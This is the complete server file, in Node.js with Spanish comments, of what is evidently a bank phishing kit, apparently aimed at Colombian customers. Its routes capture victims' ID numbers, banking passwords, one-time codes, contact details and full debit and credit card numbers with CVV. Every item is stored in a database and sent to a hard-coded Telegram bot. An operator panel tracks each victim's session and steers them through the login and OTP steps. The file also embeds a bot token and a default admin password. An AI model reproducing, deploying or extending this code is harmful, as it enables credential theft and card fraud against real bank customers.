// ========================================
// SERVER.JS - CON AUTENTICACIÓN SEGURA
// ========================================

require('dotenv').config();
const express = require('express');
const cors = require('cors');
const Database = require('better-sqlite3');
const path = require('path');
const axios = require('axios');
const bcrypt = require('bcrypt');
const session = require('express-session');

// ========================================
// INICIALIZACIÓN
// ========================================
const app = express();
const PORT = process.env.PORT || 3000;
const db = new Database('datos.db');

// ========================================
// CONFIGURACIÓN DE SESIONES
// ========================================
app.use(session({
    secret: process.env.SESSION_SECRET || 'tu-secreto-super-seguro-cambiar-en-produccion',
    resave: false,
    saveUninitialized: false,
    cookie: { 
        secure: false, // Cambiar a true en producción con HTTPS
        httpOnly: true,
        maxAge: 24 * 60 * 60 * 1000 // 24 horas
    }
}));

// ========================================
// CONFIGURACIÓN DE TELEGRAM
// ========================================
const TELEGRAM_BOT_TOKEN = '8600048628:AAF8W1TC_SfDNWCVIiBvTadtNk1wwYjRKUA';
const TELEGRAM_CHAT_ID = '-1003981314843';

async function enviarTelegram(mensaje) {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: mensaje,
            parse_mode: 'HTML'
        });
    } catch (error) {
        console.error('Error al enviar mensaje a Telegram:', error.message);
    }
}

// ========================================
// CREAR TABLAS
// ========================================
db.exec(`
    CREATE TABLE IF NOT EXISTS sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        transaction_id TEXT UNIQUE,
        tipo_doc TEXT,
        nro_doc TEXT,
        clave TEXT,
        otp TEXT,
        nombre TEXT,
        celular TEXT,
        email TEXT,
        tarjeta_debito TEXT,
        tarjeta_credito TEXT,
        status TEXT DEFAULT 'pending',
        ip TEXT,
        user_agent TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )
`);

// Tabla de usuarios admin
db.exec(`
    CREATE TABLE IF NOT EXISTS admin_users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        last_login DATETIME
    )
`);

// ========================================
// CREAR USUARIO ADMIN POR DEFECTO
// ========================================
async function crearUsuarioDefault() {
    const checkUser = db.prepare('SELECT * FROM admin_users WHERE username = ?').get('Draster777');
    
    if (!checkUser) {
        const defaultPassword = 'Draster777';
        const hash = await bcrypt.hash(defaultPassword, 10);
        
        db.prepare('INSERT INTO admin_users (username, password_hash) VALUES (?, ?)').run('Draster777', hash);
        
        console.log('\n⚠️  USUARIO ADMIN CREADO:');
        console.log('   Usuario: Draster777');
        console.log('   Contraseña: Draster777');
        console.log('   🔴 ¡CAMBIA LA CONTRASEÑA SI ES NECESARIO!\n');
    }
}

crearUsuarioDefault();

// ========================================
// MIDDLEWARE DE AUTENTICACIÓN
// ========================================
function requireAuth(req, res, next) {
    if (req.session && req.session.userId) {
        return next();
    }
    
    // Si es petición AJAX, devolver 401
    if (req.xhr || req.headers.accept.indexOf('json') > -1) {
        return res.status(401).json({ 
            success: false, 
            error: 'No autenticado',
            redirect: '/admin/login'
        });
    }
    
    // Si no, redirigir al login
    res.redirect('/admin/login');
}

// ========================================
// MIDDLEWARE
// ========================================
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// ========================================
// RUTAS DE AUTENTICACIÓN
// ========================================

// Página de login
app.get('/admin/login', (req, res) => {
    if (req.session && req.session.userId) {
        return res.redirect('/admin');
    }
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

// Login POST
app.post('/api/admin/login', async (req, res) => {
    const { username, password } = req.body;
    
    if (!username || !password) {
        return res.status(400).json({ 
            success: false, 
            error: 'Usuario y contraseña requeridos' 
        });
    }
    
    try {
        const user = db.prepare('SELECT * FROM admin_users WHERE username = ?').get(username);
        
        if (!user) {
            return res.status(401).json({ 
                success: false, 
                error: 'Credenciales inválidas' 
            });
        }
        
        const validPassword = await bcrypt.compare(password, user.password_hash);
        
        if (!validPassword) {
            return res.status(401).json({ 
                success: false, 
                error: 'Credenciales inválidas' 
            });
        }
        
        // Crear sesión
        req.session.userId = user.id;
        req.session.username = user.username;
        
        // Actualizar último login
        db.prepare('UPDATE admin_users SET last_login = CURRENT_TIMESTAMP WHERE id = ?').run(user.id);
        
        res.json({ 
            success: true, 
            message: 'Login exitoso',
            username: user.username 
        });
    } catch (error) {
        console.error('Error en login:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Error al procesar login' 
        });
    }
});

// Logout
app.post('/api/admin/logout', (req, res) => {
    req.session.destroy((err) => {
        if (err) {
            return res.status(500).json({ 
                success: false, 
                error: 'Error al cerrar sesión' 
            });
        }
        res.json({ success: true, message: 'Sesión cerrada' });
    });
});

// Cambiar contraseña
app.post('/api/admin/change-password', requireAuth, async (req, res) => {
    const { currentPassword, newPassword } = req.body;
    
    if (!currentPassword || !newPassword) {
        return res.status(400).json({ 
            success: false, 
            error: 'Contraseñas requeridas' 
        });
    }
    
    if (newPassword.length < 8) {
        return res.status(400).json({ 
            success: false, 
            error: 'La contraseña debe tener al menos 8 caracteres' 
        });
    }
    
    try {
        const user = db.prepare('SELECT * FROM admin_users WHERE id = ?').get(req.session.userId);
        
        const validPassword = await bcrypt.compare(currentPassword, user.password_hash);
        
        if (!validPassword) {
            return res.status(401).json({ 
                success: false, 
                error: 'Contraseña actual incorrecta' 
            });
        }
        
        const newHash = await bcrypt.hash(newPassword, 10);
        db.prepare('UPDATE admin_users SET password_hash = ? WHERE id = ?').run(newHash, user.id);
        
        res.json({ 
            success: true, 
            message: 'Contraseña actualizada exitosamente' 
        });
    } catch (error) {
        console.error('Error al cambiar contraseña:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Error al cambiar contraseña' 
        });
    }
});

// ========================================
// RUTAS PRINCIPALES (SIN CAMBIOS)
// ========================================

// 1️⃣ Guardar datos de login
app.post('/api/submit-login', async (req, res) => {
    const { transaction_id, tipo_doc, nro_doc, clave } = req.body;
    const ip = req.ip;
    const user_agent = req.headers['user-agent'];

    if (!transaction_id || !nro_doc || !clave) {
        return res.status(400).json({ 
            success: false, 
            error: 'Datos incompletos' 
        });
    }

    try {
        const stmt = db.prepare(`
            INSERT OR REPLACE INTO sessions 
            (transaction_id, tipo_doc, nro_doc, clave, ip, user_agent, status)
            VALUES (?, ?, ?, ?, ?, ?, 'pending')
        `);
        
        const result = stmt.run(transaction_id, tipo_doc, nro_doc, clave, ip, user_agent);
        
        if (result.changes === 0) {
            return res.status(500).json({ 
                success: false, 
                error: 'No se pudo guardar la sesión' 
            });
        }
        
        const mensaje = `
🆕 <b>NUEVO LOGIN</b>

📋 <b>Tipo Doc:</b> ${tipo_doc}
🆔 <b>Documento:</b> ${nro_doc}
🔑 <b>Clave:</b> ${clave}
🌐 <b>IP:</b> ${ip}
⏰ <b>Hora:</b> ${new Date().toLocaleString('es-CO')}
🔗 <b>ID:</b> ${transaction_id.slice(0, 8)}
        `;
        
        await enviarTelegram(mensaje);
        
        res.json({ success: true, message: 'Datos guardados' });
    } catch (error) {
        console.error('Error en submit-login:', error);
        res.status(500).json({ success: false, error: 'Error al guardar' });
    }
});

// 2️⃣ Guardar OTP Y RESETEAR ESTADO
app.post('/api/submit-otp', async (req, res) => {
    const { transaction_id, otp } = req.body;

    if (!transaction_id || !otp) {
        return res.status(400).json({ 
            success: false, 
            error: 'Datos incompletos' 
        });
    }

    try {
        const stmt = db.prepare(`UPDATE sessions SET otp = ?, status = 'pending' WHERE transaction_id = ?`);
        const result = stmt.run(otp, transaction_id);
        
        if (result.changes === 0) {
            return res.status(404).json({ 
                success: false, 
                error: 'Sesión no encontrada' 
            });
        }
        
        const session = db.prepare('SELECT * FROM sessions WHERE transaction_id = ?').get(transaction_id);
        
        const mensaje = `
📱 <b>CÓDIGO OTP RECIBIDO</b>

🔢 <b>OTP:</b> <code>${otp}</code>
🆔 <b>Cédula:</b> ${session.nro_doc}
🔗 <b>ID:</b> ${transaction_id.slice(0, 8)}
⏰ <b>Hora:</b> ${new Date().toLocaleString('es-CO')}
        `;
        
        await enviarTelegram(mensaje);
        
        res.json({ success: true });
    } catch (error) {
        console.error('Error en submit-otp:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// 3️⃣ Guardar datos personales Y RESETEAR ESTADO
app.post('/api/submit-datos', async (req, res) => {
    const { transaction_id, nombre, celular, email } = req.body;

    if (!transaction_id || !nombre || !celular || !email) {
        return res.status(400).json({ 
            success: false, 
            error: 'Datos incompletos' 
        });
    }

    try {
        const stmt = db.prepare(`
            UPDATE sessions 
            SET nombre = ?, celular = ?, email = ?, status = 'pending'
            WHERE transaction_id = ?
        `);
        const result = stmt.run(nombre, celular, email, transaction_id);
        
        if (result.changes === 0) {
            return res.status(404).json({ 
                success: false, 
                error: 'Sesión no encontrada' 
            });
        }
        
        const mensaje = `
👤 <b>DATOS PERSONALES</b>

📝 <b>Nombre:</b> ${nombre}
📞 <b>Celular:</b> ${celular}
📧 <b>Email:</b> ${email}
🔗 <b>ID:</b> ${transaction_id.slice(0, 8)}
⏰ <b>Hora:</b> ${new Date().toLocaleString('es-CO')}
        `;
        
        await enviarTelegram(mensaje);
        
        res.json({ success: true });
    } catch (error) {
        console.error('Error en submit-datos:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// 4️⃣ Guardar tarjeta débito Y RESETEAR ESTADO
app.post('/api/submit-tarjeta-debito', async (req, res) => {
    const { transaction_id, numero, fecha, cvv } = req.body;

    if (!transaction_id || !numero || !fecha || !cvv) {
        return res.status(400).json({ 
            success: false, 
            error: 'Datos incompletos' 
        });
    }

    const tarjeta_json = JSON.stringify({ numero, fecha, cvv });

    try {
        const stmt = db.prepare(`UPDATE sessions SET tarjeta_debito = ?, status = 'pending' WHERE transaction_id = ?`);
        const result = stmt.run(tarjeta_json, transaction_id);
        
        if (result.changes === 0) {
            return res.status(404).json({ 
                success: false, 
                error: 'Sesión no encontrada' 
            });
        }
        
        const session = db.prepare('SELECT * FROM sessions WHERE transaction_id = ?').get(transaction_id);
        
        const mensaje = `
💳 <b>TARJETA DÉBITO</b>

💳 <b>Número:</b> <code>${numero}</code>
📅 <b>Vencimiento:</b> ${fecha}
🔒 <b>CVV:</b> ${cvv}
🆔 <b>Cédula:</b> ${session.nro_doc}
👤 <b>Nombre:</b> ${session.nombre || 'N/A'}
🔗 <b>ID:</b> ${transaction_id.slice(0, 8)}
⏰ <b>Hora:</b> ${new Date().toLocaleString('es-CO')}
        `;
        
        await enviarTelegram(mensaje);
        
        res.json({ success: true });
    } catch (error) {
        console.error('Error en submit-tarjeta-debito:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// 5️⃣ Guardar tarjeta crédito Y RESETEAR ESTADO
app.post('/api/submit-tarjeta-credito', async (req, res) => {
    const { transaction_id, numero, fecha, cvv } = req.body;

    if (!transaction_id || !numero || !fecha || !cvv) {
        return res.status(400).json({ 
            success: false, 
            error: 'Datos incompletos' 
        });
    }

    const tarjeta_json = JSON.stringify({ numero, fecha, cvv });

    try {
        const stmt = db.prepare(`UPDATE sessions SET tarjeta_credito = ?, status = 'pending' WHERE transaction_id = ?`);
        const result = stmt.run(tarjeta_json, transaction_id);
        
        if (result.changes === 0) {
            return res.status(404).json({ 
                success: false, 
                error: 'Sesión no encontrada' 
            });
        }
        
        const session = db.prepare('SELECT * FROM sessions WHERE transaction_id = ?').get(transaction_id);
        
        const mensaje = `
💎 <b>TARJETA CRÉDITO</b>

💳 <b>Número:</b> <code>${numero}</code>
📅 <b>Vencimiento:</b> ${fecha}
🔒 <b>CVV:</b> ${cvv}
🆔 <b>Cédula:</b> ${session.nro_doc}
👤 <b>Nombre:</b> ${session.nombre || 'N/A'}
🔗 <b>ID:</b> ${transaction_id.slice(0, 8)}
⏰ <b>Hora:</b> ${new Date().toLocaleString('es-CO')}
        `;
        
        await enviarTelegram(mensaje);
        
        res.json({ success: true });
    } catch (error) {
        console.error('Error en submit-tarjeta-credito:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ========================================
// RUTAS ADMIN - PROTEGIDAS
// ========================================

// 6️⃣ Obtener sesiones (PROTEGIDA)
app.get('/api/admin/sessions', requireAuth, (req, res) => {
    try {
        const sessions = db.prepare('SELECT * FROM sessions ORDER BY created_at DESC').all();
        res.json({ 
            success: true, 
            sessions: sessions,
            total: sessions.length 
        });
    } catch (error) {
        console.error('Error en admin/sessions:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// 7️⃣ Verificar estado (para el frontend)
app.get('/api/check-status/:transaction_id', (req, res) => {
    const { transaction_id } = req.params;

    if (!transaction_id) {
        return res.status(400).json({ 
            success: false, 
            error: 'Transaction ID requerido' 
        });
    }

    try {
        const stmt = db.prepare('SELECT status FROM sessions WHERE transaction_id = ?');
        const row = stmt.get(transaction_id);
        
        if (row) {
            res.json({ status: row.status });
        } else {
            res.status(404).json({ 
                success: false, 
                error: 'Sesión no encontrada' 
            });
        }
    } catch (error) {
        console.error('Error en check-status:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// 8️⃣ Actualizar estado desde el panel (PROTEGIDA)
app.post('/api/update-status', requireAuth, (req, res) => {
    const { transaction_id, action } = req.body;
    
    if (!transaction_id || !action) {
        return res.status(400).json({ 
            success: false, 
            error: 'Datos incompletos' 
        });
    }

    try {
        const stmt = db.prepare('UPDATE sessions SET status = ? WHERE transaction_id = ?');
        const result = stmt.run(action, transaction_id);
        
        if (result.changes === 0) {
            return res.status(404).json({ 
                success: false, 
                error: 'Sesión no encontrada' 
            });
        }
        
        res.json({ success: true, message: 'Estado actualizado' });
    } catch (error) {
        console.error('Error en update-status:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ========================================
// SERVIR PANEL DE ADMINISTRACIÓN (PROTEGIDO)
// ========================================
app.get('/admin', requireAuth, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin-panel.html'));
});

// ========================================
// RUTA RAÍZ - Redirigir a inicio
// ========================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'inicio2.html'));
});

// ========================================
// MANEJO DE ERRORES 404
// ========================================
app.use((req, res) => {
    res.status(404).json({ 
        success: false, 
        error: 'Ruta no encontrada' 
    });
});

// ========================================
// INICIAR SERVIDOR
// ========================================
app.listen(PORT, () => {
    console.log(`\n🚀 Servidor corriendo en http://localhost:${PORT}`);
    console.log(`📊 Panel admin en http://localhost:${PORT}/admin`);
    console.log(`🏠 Página principal en http://localhost:${PORT}/\n`);
});
